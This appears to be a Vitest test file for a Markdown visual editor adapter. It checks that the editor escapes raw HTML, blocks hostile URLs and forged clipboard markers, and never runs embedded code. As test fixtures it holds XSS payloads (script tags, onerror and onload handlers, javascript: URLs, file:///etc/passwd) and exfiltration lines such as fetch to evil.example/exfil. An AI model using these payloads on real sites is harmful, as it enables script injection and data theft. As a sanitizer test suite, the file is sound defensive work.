import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { mount } from "@vue/test-utils";
import { MAX_MARKDOWN_BYTES } from "@glyphquire/api-contract";
import { createDocumentEngine, semanticNormalize } from "@glyphquire/document-engine";
import { editorViewCtx, type Editor } from "@milkdown/kit/core";
import { Fragment, Slice } from "@milkdown/kit/prose/model";
import { AllSelection } from "@milkdown/kit/prose/state";
import type { EditorView } from "@milkdown/kit/prose/view";
import VisualEditor from "../../components/visual/VisualEditor.vue";
import { MilkdownVisualAdapter } from "./MilkdownVisualAdapter.js";
import {
  blockWarningAttrsFromSource,
  GLYPHQUIRE_FRONTMATTER,
  inlineWarningAttrsFromSource,
  resolveVisualUrl,
} from "./schema.js";

const engine = createDocumentEngine();
const fixturesRoot = resolve(process.cwd(), "../../packages/document-engine/tests/fixtures");

function fixture(group: string, name: string): string {
  return readFileSync(resolve(fixturesRoot, group, name, "input.md"), "utf8");
}

async function mountedAdapter(markdown?: string) {
  const host = document.createElement("div");
  host.dataset.glyphquireTestHost = "";
  document.body.appendChild(host);
  const adapter = new MilkdownVisualAdapter();
  adapter.mount(host);
  await adapter.whenReady();
  if (markdown !== undefined) adapter.setMarkdown(markdown);
  return { adapter, host };
}

async function nextListenerFlush(): Promise<void> {
  await new Promise((resolve) => setTimeout(resolve, 250));
}

function proseMirrorView(adapter: MilkdownVisualAdapter): EditorView {
  const editor = (adapter as unknown as { editor: Editor | undefined }).editor;
  if (!editor) throw new Error("expected a ready Milkdown editor");
  return editor.action((ctx) => ctx.get(editorViewCtx));
}

function serializeAllForClipboard(adapter: MilkdownVisualAdapter): {
  readonly html: string;
  readonly text: string;
} {
  const view = proseMirrorView(adapter);
  view.dispatch(view.state.tr.setSelection(new AllSelection(view.state.doc)));
  const serialized = view.serializeForClipboard(view.state.selection.content());
  return { html: serialized.dom.innerHTML, text: serialized.text };
}

function warningNodeCount(adapter: MilkdownVisualAdapter): number {
  let count = 0;
  proseMirrorView(adapter).state.doc.descendants((node) => {
    if (node.type.name === "gq_inline_warning" || node.type.name === "gq_warning") count += 1;
  });
  return count;
}

function warningMarkerHtml(kind: "inline" | "block", source: string): string {
  const element = document.createElement(kind === "inline" ? "span" : "section");
  element.setAttribute(
    kind === "inline" ? "data-glyphquire-inline-warning" : "data-glyphquire-warning",
    "escaped",
  );
  element.textContent = source;
  return element.outerHTML;
}

describe("MilkdownVisualAdapter", () => {
  const cleanups: Array<() => void> = [];

  afterEach(() => {
    while (cleanups.length > 0) cleanups.pop()?.();
    vi.restoreAllMocks();
    vi.unstubAllGlobals();
    for (const host of document.querySelectorAll("[data-glyphquire-test-host]")) host.remove();
    delete (globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel;
    delete (globalThis as Record<string, unknown>).__glyphquireImportSpy;
  });

  it("mounts Milkdown behind the EditorAdapter seam and focuses its ProseMirror surface", async () => {
    const { adapter, host } = await mountedAdapter();
    cleanups.push(() => adapter.destroy());

    expect(host.querySelector(".milkdown .ProseMirror")).not.toBeNull();
    adapter.focus();
    expect(document.activeElement).toBe(host.querySelector(".ProseMirror"));
  });

  it("silently projects authoritative Markdown and preserves semantic AST", async () => {
    const markdown = fixture("callout", "valid-full");
    const { adapter } = await mountedAdapter();
    cleanups.push(() => adapter.destroy());
    const listener = vi.fn();
    adapter.onChange(listener);

    adapter.setMarkdown(markdown);
    await nextListenerFlush();

    const before = engine.parse(markdown);
    const after = engine.parse(adapter.getMarkdown());
    expect(before.ok).toBe(true);
    expect(after.ok).toBe(true);
    if (!before.ok || !after.ok) throw new Error("expected accepted documents");
    expect(semanticNormalize(after.document)).toEqual(semanticNormalize(before.document));
    expect(listener).not.toHaveBeenCalled();
  });

  it("rejects a fatal projection without replacing the last accepted Markdown", async () => {
    const accepted = fixture("sticky", "valid-minimal");
    const { adapter } = await mountedAdapter(accepted);
    cleanups.push(() => adapter.destroy());

    expect(() => adapter.setMarkdown("# Missing spec marker")).toThrow(
      "Visual projection requires accepted GlyphQuire Markdown",
    );
    expect(engine.parse(adapter.getMarkdown()).ok).toBe(true);
    expect(adapter.getMarkdown()).toBe(engine.serialize(engine.parse(accepted).document!));
  });

  it("blocks user control edits while read-only and emits one canonical change when writable", async () => {
    const { adapter, host } = await mountedAdapter(fixture("p5", "valid-minimal"));
    cleanups.push(() => adapter.destroy());
    const listener = vi.fn();
    adapter.onChange(listener);
    const source = host.querySelector<HTMLTextAreaElement>("[data-glyphquire-runtime-source]");
    expect(source).not.toBeNull();

    adapter.setReadOnly(true);
    expect(source?.disabled).toBe(true);
    if (source) {
      source.value = "globalThis.READ_ONLY_FORGED = true";
      source.dispatchEvent(new Event("change", { bubbles: true }));
    }
    await nextListenerFlush();
    expect(adapter.getMarkdown()).not.toContain("READ_ONLY_FORGED");
    expect(listener).not.toHaveBeenCalled();

    adapter.setReadOnly(false);
    expect(source?.disabled).toBe(false);
    if (source) {
      source.value = "function setup() { createCanvas(10, 10); }";
      source.dispatchEvent(new Event("change", { bubbles: true }));
    }
    await nextListenerFlush();
    expect(adapter.getMarkdown()).toContain("createCanvas(10, 10)");
    expect(listener).toHaveBeenCalledTimes(1);
  });

  it("renders valid tabs and columns in source order and admits only legal structural children", async () => {
    const markdown = [
      "---",
      "glyphquire-spec: 1",
      "---",
      "",
      "::::tabs",
      ':::tab{title="First"}',
      "Alpha",
      ":::",
      ':::tab{title="Second"}',
      "Beta",
      ":::",
      "::::",
      "",
      '::::columns{count="2"}',
      ":::column",
      "Left",
      ":::",
      ":::column",
      "Right",
      ":::",
      "::::",
      "",
    ].join("\n");
    const { adapter, host } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());

    expect(
      [...host.querySelectorAll("[data-glyphquire-node='tab']")].map((node) =>
        node.querySelector("[data-glyphquire-tab-title]")?.getAttribute("value"),
      ),
    ).toEqual(["First", "Second"]);
    expect(
      [...host.querySelectorAll("[data-glyphquire-node='column']")].map(
        (node) => node.textContent?.includes("Left") || node.textContent?.includes("Right"),
      ),
    ).toEqual([true, true]);
    expect(adapter.canContainForTests("tabs", "tab")).toBe(true);
    expect(adapter.canContainForTests("tabs", "paragraph")).toBe(false);
    expect(adapter.canContainForTests("columns", "column")).toBe(true);
    expect(adapter.canContainForTests("columns", "tab")).toBe(false);
  });

  it("escapes raw HTML and unknown or invalid blocks into lossless warning nodes", async () => {
    const markdown = [
      "---",
      "glyphquire-spec: 1",
      "---",
      "",
      '<script>globalThis.__glyphquireRuntimeSentinel = "script"</script>',
      "",
      "<svg onload=\"globalThis.__glyphquireRuntimeSentinel = 'svg'\"></svg>",
      "",
      ':::future{x="1" handler="<img src=x onerror=boom()>"}',
      "Keep **every** child.",
      ":::",
      "",
      ':::callout{type="critical" handler="<script>boom()</script>"}',
      "Invalid child.",
      ":::",
      "",
    ].join("\n");
    const { adapter, host } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());

    expect(host.querySelectorAll("[data-glyphquire-warning]").length).toBeGreaterThanOrEqual(4);
    expect(host.querySelector("script, svg, iframe, [onload], [onerror]")).toBeNull();
    expect(host.textContent).toContain("<script>");
    expect(host.textContent).toContain("future");
    expect(host.textContent).toContain("handler");

    const before = engine.parse(markdown);
    const after = engine.parse(adapter.getMarkdown());
    expect(before.ok).toBe(true);
    expect(after.ok).toBe(true);
    if (!before.ok || !after.ok) throw new Error("expected recoverable documents");
    expect(semanticNormalize(after.document)).toEqual(semanticNormalize(before.document));
  });

  it("losslessly escapes an accepted inline text directive", async () => {
    const markdown = ["---", "glyphquire-spec: 1", "---", "", 'A :future[child]{a="1"} B', ""].join(
      "\n",
    );
    const before = engine.parse(markdown);
    expect(before.ok).toBe(true);
    if (!before.ok) throw new Error("expected accepted inline directive Markdown");

    const { adapter, host } = await mountedAdapter();
    cleanups.push(() => adapter.destroy());
    expect(() => adapter.setMarkdown(markdown)).not.toThrow();

    const warning = host.querySelector("[data-glyphquire-inline-warning]");
    expect(warning?.textContent).toContain(':future[child]{a="1"}');
    expect(host.querySelector("script, svg, iframe, [onerror], [onload]")).toBeNull();

    const after = engine.parse(adapter.getMarkdown());
    expect(after.ok).toBe(true);
    if (!after.ok) throw new Error("expected accepted visual inline directive output");
    expect(semanticNormalize(after.document)).toEqual(semanticNormalize(before.document));
  });

  it("round-trips escaped inline and block warnings through the real clipboard DOM", async () => {
    const markdown = [
      "---",
      "glyphquire-spec: 1",
      "---",
      "",
      'A :future[child]{a="1"} B',
      "",
      ':::future{x="1"}',
      "Keep **every** child.",
      ":::",
      "",
    ].join("\n");
    const source = await mountedAdapter(markdown);
    const target = await mountedAdapter();
    cleanups.push(
      () => source.adapter.destroy(),
      () => target.adapter.destroy(),
    );

    const clipboard = serializeAllForClipboard(source.adapter);
    expect(clipboard.html).toContain("data-glyphquire-inline-warning");
    expect(clipboard.html).toContain("data-glyphquire-warning");
    expect(clipboard.text).toContain(':future[child]{a="1"}');
    expect(clipboard.text).toContain(':::future{x="1"}');
    expect(proseMirrorView(target.adapter).pasteHTML(clipboard.html)).toBe(true);

    const before = engine.parse(markdown);
    const after = engine.parse(target.adapter.getMarkdown());
    expect(before.ok).toBe(true);
    expect(after.ok).toBe(true);
    if (!before.ok || !after.ok) throw new Error("expected accepted clipboard documents");
    expect(semanticNormalize(after.document)).toEqual(semanticNormalize(before.document));
  });

  it("rejects forged warning markers without creating serializer-poisoning nodes", async () => {
    (globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel = 0;
    const malformedMarkers = [
      '<span data-glyphquire-inline-warning="escaped"></span>',
      '<section data-glyphquire-warning="escaped"></section>',
      '<span data-glyphquire-inline-warning>:future[child]{a="1"}</span>',
      "<section data-glyphquire-warning>:::future\nchild\n:::\n</section>",
      '<span data-glyphquire-inline-warning="forged">:future[child]{a="1"}</span>',
      '<section data-glyphquire-warning="forged">:::future\nchild\n:::\n</section>',
      '<span data-glyphquire-inline-warning="escaped" data-directive-json="{]">not a directive</span>',
      '<section data-glyphquire-warning="escaped" data-semantic-json="{]">not a block</section>',
      warningMarkerHtml("inline", ':::future{x="1"}\nchild\n:::\n'),
      warningMarkerHtml("block", ':future[child]{a="1"}'),
      warningMarkerHtml("inline", ':future[child]{a="1"}\n'),
      warningMarkerHtml("block", ":::future\nchild\n:::"),
      '<span data-glyphquire-inline-warning="escaped"><b>:future[child]{a="1"}</b></span>',
      '<section data-glyphquire-warning="escaped"><script>globalThis.__glyphquireRuntimeSentinel = 1</script></section>',
      warningMarkerHtml("inline", "é".repeat(MAX_MARKDOWN_BYTES / 2 + 1)),
      warningMarkerHtml("block", "x".repeat(MAX_MARKDOWN_BYTES + 1)),
    ];

    for (const marker of malformedMarkers) {
      const { adapter } = await mountedAdapter();
      cleanups.push(() => adapter.destroy());
      expect(() => proseMirrorView(adapter).pasteHTML(marker)).not.toThrow();
      expect(warningNodeCount(adapter)).toBe(0);
      expect(() => adapter.getMarkdown()).not.toThrow();
      expect((globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel).toBe(0);
      adapter.destroy();
    }
  });

  it("reconstructs canonical pasted warning source without trusting DOM JSON attributes", async () => {
    const sentinel = vi.fn();
    (globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel = sentinel;
    const cases = [
      {
        kind: "inline" as const,
        source: ':future[child]{a="1" handler="<img src=x onerror=boom()>"}',
      },
      {
        kind: "block" as const,
        source: [
          ':::future{x="1" handler="<script>boom()</script>"}',
          "Keep **every** child.",
          "<script>globalThis.__glyphquireRuntimeSentinel()</script>",
          ":::",
          "",
        ].join("\n"),
      },
    ];

    for (const item of cases) {
      const expected = engine.parse(`${GLYPHQUIRE_FRONTMATTER}${item.source}`);
      expect(expected.ok).toBe(true);
      if (!expected.ok) throw new Error("expected accepted canonical attacker source");
      const canonicalBody = engine
        .serialize(expected.document)
        .slice(GLYPHQUIRE_FRONTMATTER.length);
      const canonicalSource =
        item.kind === "inline" ? canonicalBody.replace(/\n+$/, "") : canonicalBody;
      const container = document.createElement(item.kind === "inline" ? "span" : "section");
      container.setAttribute(
        item.kind === "inline" ? "data-glyphquire-inline-warning" : "data-glyphquire-warning",
        "escaped",
      );
      container.setAttribute("data-semantic-json", '{"type":"script","value":"forged"}');
      container.setAttribute("data-source", "forged");
      container.setAttribute("onmouseover", "globalThis.__glyphquireRuntimeSentinel()");
      container.textContent = canonicalSource;

      const { adapter, host } = await mountedAdapter();
      cleanups.push(() => adapter.destroy());
      expect(proseMirrorView(adapter).pasteHTML(container.outerHTML)).toBe(true);
      expect(warningNodeCount(adapter)).toBe(1);
      expect(
        host.querySelector("script, svg, iframe, [onerror], [onload], [onmouseover]"),
      ).toBeNull();
      expect(sentinel).not.toHaveBeenCalled();

      const actual = engine.parse(adapter.getMarkdown());
      expect(actual.ok).toBe(true);
      if (!actual.ok) throw new Error("expected accepted pasted warning source");
      expect(semanticNormalize(actual.document)).toEqual(semanticNormalize(expected.document));
      adapter.destroy();
    }
  });

  it("fails closed when invalid warning attrs are inserted or exported programmatically", async () => {
    const { adapter } = await mountedAdapter();
    cleanups.push(() => adapter.destroy());
    const view = proseMirrorView(adapter);
    const inlineType = view.state.schema.nodes.gq_inline_warning;
    const blockType = view.state.schema.nodes.gq_warning;
    if (!inlineType || !blockType) throw new Error("expected warning node schemas");

    const missingInline = inlineType.create();
    const missingBlock = blockType.create();
    expect(() => missingInline.check()).toThrow();
    expect(() => missingBlock.check()).toThrow();

    const invalidInline = inlineType.create({ directiveJson: "", source: "" });
    const invalidBlock = blockType.create({
      semanticJson: "{}",
      source: "",
      label: "Unsupported block",
    });
    expect(() => invalidInline.check()).toThrow();
    expect(() => invalidBlock.check()).toThrow();
    expect(() =>
      view.serializeForClipboard(new Slice(Fragment.from(invalidInline), 0, 0)),
    ).toThrow();
    expect(() =>
      view.serializeForClipboard(new Slice(Fragment.from(invalidBlock), 0, 0)),
    ).toThrow();

    const before = view.state.doc.toJSON();
    view.dispatch(view.state.tr.replaceSelectionWith(invalidInline));
    expect(view.state.doc.toJSON()).toEqual(before);
    view.dispatch(view.state.tr.replaceSelectionWith(invalidBlock));
    expect(view.state.doc.toJSON()).toEqual(before);
    expect(() => adapter.getMarkdown()).not.toThrow();

    const inlineOne = inlineWarningAttrsFromSource(":future[one]");
    const inlineTwo = inlineWarningAttrsFromSource(":future[two]");
    const blockOne = blockWarningAttrsFromSource(":::future\none\n:::\n");
    const blockTwo = blockWarningAttrsFromSource(":::other\ntwo\n:::\n");
    if (!inlineOne || !inlineTwo || !blockOne || !blockTwo) {
      throw new Error("expected canonical warning attrs");
    }
    const mismatchedInline = inlineType.create({
      directiveJson: inlineOne.directiveJson,
      source: inlineTwo.source,
    });
    const mismatchedBlock = blockType.create({
      semanticJson: blockOne.semanticJson,
      source: blockTwo.source,
      label: blockOne.label,
    });
    expect(() => mismatchedInline.check()).not.toThrow();
    expect(() => mismatchedBlock.check()).not.toThrow();
    expect(() =>
      view.serializeForClipboard(new Slice(Fragment.from(mismatchedInline), 0, 0)),
    ).toThrow();
    expect(() =>
      view.serializeForClipboard(new Slice(Fragment.from(mismatchedBlock), 0, 0)),
    ).toThrow();
    view.dispatch(view.state.tr.replaceSelectionWith(mismatchedInline));
    view.dispatch(view.state.tr.replaceSelectionWith(mismatchedBlock));
    expect(view.state.doc.toJSON()).toEqual(before);
  });

  it("removes hostile rendered URL sinks and hardens safe external links", async () => {
    const openSpy = vi.spyOn(window, "open").mockImplementation(() => null);
    const fetchSpy = vi.fn();
    vi.stubGlobal("fetch", fetchSpy);
    const markdown = [
      "---",
      "glyphquire-spec: 1",
      "---",
      "",
      "[Hostile link](javascript:globalThis.__glyphquireRuntimeSentinel=1)",
      "",
      "![Hostile image](data:image/svg+xml,%3Csvg%20onload%3Dalert(1)%3E)",
      "",
      "[Safe external](https://docs.example/guide)",
      "",
    ].join("\n");
    const { adapter, host } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());

    const hostileLink = [...host.querySelectorAll("a")].find(
      (link) => link.textContent === "Hostile link",
    );
    const safeLink = [...host.querySelectorAll("a")].find(
      (link) => link.textContent === "Safe external",
    );
    const hostileImage = host.querySelector<HTMLImageElement>('img[alt="Hostile image"]');

    expect(hostileLink?.hasAttribute("href")).toBe(false);
    expect(hostileImage?.hasAttribute("src")).toBe(false);
    expect(safeLink?.getAttribute("href")).toBe("https://docs.example/guide");
    expect(safeLink?.getAttribute("target")).toBe("_blank");
    expect(safeLink?.getAttribute("rel")).toBe("noopener noreferrer");

    hostileLink?.dispatchEvent(new MouseEvent("click", { bubbles: true, cancelable: true }));
    expect((globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel).toBeUndefined();
    expect(openSpy).not.toHaveBeenCalled();
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it("keeps p5 and canvas source entirely inert with no execution or capability calls", async () => {
    const fetchSpy = vi.fn();
    const workerSpy = vi.fn();
    const openSpy = vi.spyOn(window, "open").mockImplementation(() => null);
    const importSpy = vi.fn();
    const createElement = document.createElement.bind(document);
    const activeElementSpy = vi.spyOn(document, "createElement").mockImplementation(((
      tagName: string,
      options?: ElementCreationOptions,
    ) => {
      if (["script", "iframe", "object", "embed"].includes(tagName.toLowerCase())) {
        throw new Error(`active element requested: ${tagName}`);
      }
      return createElement(tagName, options);
    }) as typeof document.createElement);
    vi.stubGlobal("fetch", fetchSpy);
    vi.stubGlobal("Worker", workerSpy);
    (globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel = 0;
    (globalThis as Record<string, unknown>).__glyphquireImportSpy = importSpy;

    const source = [
      "globalThis.__glyphquireRuntimeSentinel += 1;",
      'document.body.append(document.createElement("iframe"));',
      'window.open("https://evil.example/");',
      'fetch("https://evil.example/exfil");',
      'new Worker("https://evil.example/worker.js");',
      'import("data:text/javascript,globalThis.__glyphquireImportSpy()")',
    ].join("\n");
    const markdown = [
      "---",
      "glyphquire-spec: 1",
      "---",
      "",
      ':::p5{height="400" network="javascript:alert(1)" autoplay="true"}',
      "```js",
      source,
      "```",
      ":::",
      "",
      ':::canvas{height="200" network="//evil.example/x"}',
      "```js",
      source,
      "```",
      ":::",
      "",
    ].join("\n");

    const { adapter, host } = await mountedAdapter(markdown);
    cleanups.push(() => adapter.destroy());
    await nextListenerFlush();

    expect((globalThis as Record<string, unknown>).__glyphquireRuntimeSentinel).toBe(0);
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(workerSpy).not.toHaveBeenCalled();
    expect(openSpy).not.toHaveBeenCalled();
    expect(importSpy).not.toHaveBeenCalled();
    expect(activeElementSpy).not.toHaveBeenCalledWith(
      expect.stringMatching(/^(script|iframe|object|embed)$/i),
      expect.anything(),
    );
    expect(host.querySelector("canvas, script, iframe, object, embed")).toBeNull();
    expect(host.querySelectorAll("[data-glyphquire-runtime-placeholder]")).toHaveLength(2);
    expect(adapter.getMarkdown()).toContain(source);
  });

  it("tears down Milkdown and rejects further mounted-only operations", async () => {
    const { adapter, host } = await mountedAdapter(fixture("toggle", "valid-minimal"));
    adapter.destroy();

    expect(host.querySelector(".milkdown")).toBeNull();
    expect(() => adapter.focus()).toThrow("MilkdownVisualAdapter is not mounted");
    expect(() => adapter.destroy()).not.toThrow();
  });
});

describe("central visual URL policy", () => {
  const baseUrl = "https://app.glyphquire.test/workbench";

  it.each([
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "java\tscript:alert(1)",
    "javascript%3Aalert(1)",
    "javascript%253Aalert(1)",
    "data:text/html,<script>alert(1)</script>",
    "file:///etc/passwd",
    "blob:https://app.glyphquire.test/id",
    "//evil.example/path",
    "\\\\evil.example\\path",
    "https://user:password@evil.example/path",
    "https%3A%2F%2Fevil.example/path",
    "\u0000https://evil.example/path",
  ])("rejects hostile or ambiguous link URLs: %s", (url) => {
    expect(resolveVisualUrl(url, "link", baseUrl)).toBeNull();
  });

  it("applies safe external link relationship and target attributes", () => {
    expect(resolveVisualUrl("https://docs.example/guide", "link", baseUrl)).toEqual({
      href: "https://docs.example/guide",
      external: true,
      rel: "noopener noreferrer",
      target: "_blank",
    });
    expect(resolveVisualUrl("/notes/one", "link", baseUrl)).toEqual({
      href: "/notes/one",
      external: false,
    });
  });

  it("allows only passive HTTP(S) or relative image locations", () => {
    expect(resolveVisualUrl("https://cdn.example/image.png", "image", baseUrl)?.href).toBe(
      "https://cdn.example/image.png",
    );
    expect(resolveVisualUrl("/assets/image.png", "image", baseUrl)?.href).toBe("/assets/image.png");
    expect(resolveVisualUrl("mailto:person@example.com", "image", baseUrl)).toBeNull();
    expect(
      resolveVisualUrl("data:image/svg+xml,<svg onload=alert(1)>", "image", baseUrl),
    ).toBeNull();
  });
});

describe("VisualEditor", () => {
  it("defaults to a fail-safe read-only Milkdown projection", async () => {
    const wrapper = mount(VisualEditor, {
      props: { markdown: fixture("callout", "valid-minimal") },
      attachTo: document.body,
    });

    await vi.waitFor(() => {
      expect(wrapper.get(".ProseMirror").attributes("contenteditable")).toBe("false");
    });
    expect(wrapper.emitted("update:markdown")).toBeUndefined();
    const element = wrapper.element;
    wrapper.unmount();
    element.remove();
  });

  it("grants editing only when explicitly authorized and keeps projections silent", async () => {
    const wrapper = mount(VisualEditor, {
      props: { markdown: fixture("sticky", "valid-minimal"), readOnly: false },
      attachTo: document.body,
    });

    await vi.waitFor(() => {
      expect(wrapper.get(".ProseMirror").attributes("contenteditable")).toBe("true");
    });
    await wrapper.setProps({ markdown: fixture("toggle", "valid-minimal") });
    await nextListenerFlush();
    expect(wrapper.emitted("update:markdown")).toBeUndefined();
    const element = wrapper.element;
    wrapper.unmount();
    element.remove();
  });
});
